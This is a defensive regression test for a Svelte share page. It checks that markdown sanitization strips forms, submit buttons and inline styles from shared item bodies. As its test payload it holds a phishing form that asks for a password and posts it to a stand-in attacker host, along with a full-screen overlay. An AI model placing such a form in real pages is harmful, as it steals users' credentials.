// BUG-3669: the share page sanitized item bodies with DOMPurify's DEFAULT
// policy, which keeps <form>, password inputs, action/method and style. Any
// editor of a shared item could put a "Sign in to Pad" form on Pad's origin
// that posts to another site. Both render paths (the marked pipeline and its
// fallback) now use the markdown allowlist. The collection inline-expand
// reads the same `sanitizeMarkdown` as the direct item share
// (renderItemContent), so the item share exercises the function both use.
import { describe, it, expect, vi, afterEach } from 'vitest';
import { cleanup, render } from '@testing-library/svelte';

const share = vi.hoisted(() => ({ payload: null as unknown, throwRender: false }));

vi.mock('$lib/api/client', () => ({
	api: { share: { get: vi.fn(async () => share.payload) } },
	withRequestDeadline: vi.fn(),
}));

vi.mock('$lib/utils/markdown', async (importOriginal) => {
	const real = await importOriginal<typeof import('$lib/utils/markdown')>();
	return {
		...real,
		renderMarkedWithAttachments: (...args: Parameters<typeof real.renderMarkedWithAttachments>) => {
			if (share.throwRender) throw new Error('forced: take the fallback path');
			return real.renderMarkedWithAttachments(...args);
		},
	};
});

import { page } from '$app/state';
import SharePage from './+page.svelte';

const PAYLOAD = [
	'<form action="https://attacker.example/collect" method="post">',
	'<p>Sign in to Pad</p>',
	'<input type="password" name="pw">',
	'<button type="submit">Sign in</button>',
	'</form>',
	'<p style="position:fixed;inset:0">Overlay</p>',
	'',
	'Body marker.',
].join('\n');

async function settle() {
	for (let i = 0; i < 20; i++) await Promise.resolve();
}

async function renderShare() {
	page.params = { token: 'tok' };
	share.payload = { type: 'item', item: { title: 'Notes', ref: 'DOC-1', fields: {}, content: PAYLOAD } };
	const { container } = render(SharePage);
	await settle();
	// Found by TEXT, so an unrendered body fails here, not on a vacuous absence.
	expect(container.textContent, 'the body did not render').toContain('Body marker.');
	return container;
}

function expectInert(container: HTMLElement) {
	expect(container.querySelector('form'), 'a <form> reached the page').toBeNull();
	expect(container.querySelector('[action]'), 'an action attribute reached the page').toBeNull();
	expect(container.querySelector('button[type="submit"]'), 'a submit button reached the page').toBeNull();
	// The markdown allowlist keeps <input> (task-list checkboxes), as it does
	// for every rendered body. An input with no form owner cannot submit, so
	// the property is "no form owner", not "no input".
	for (const input of container.querySelectorAll('input')) {
		expect((input as HTMLInputElement).form, 'an input kept a form owner').toBeNull();
		expect(input.hasAttribute('form') || input.hasAttribute('formaction'), 'an input kept a form attribute').toBe(false);
	}
	const styled = [...container.querySelectorAll('[style]')].filter((el) => el.textContent?.includes('Overlay'));
	expect(styled, 'an inline style reached the page').toEqual([]);
}

afterEach(() => {
	cleanup();
	share.throwRender = false;
});

describe('share page: an item body cannot carry a form or inline style (BUG-3669)', () => {
	it('the marked pipeline strips the form, its fields and the style', async () => {
		expectInert(await renderShare());
	});

	it('the fallback path (renderer threw) strips them too', async () => {
		share.throwRender = true;
		expectInert(await renderShare());
	});
});
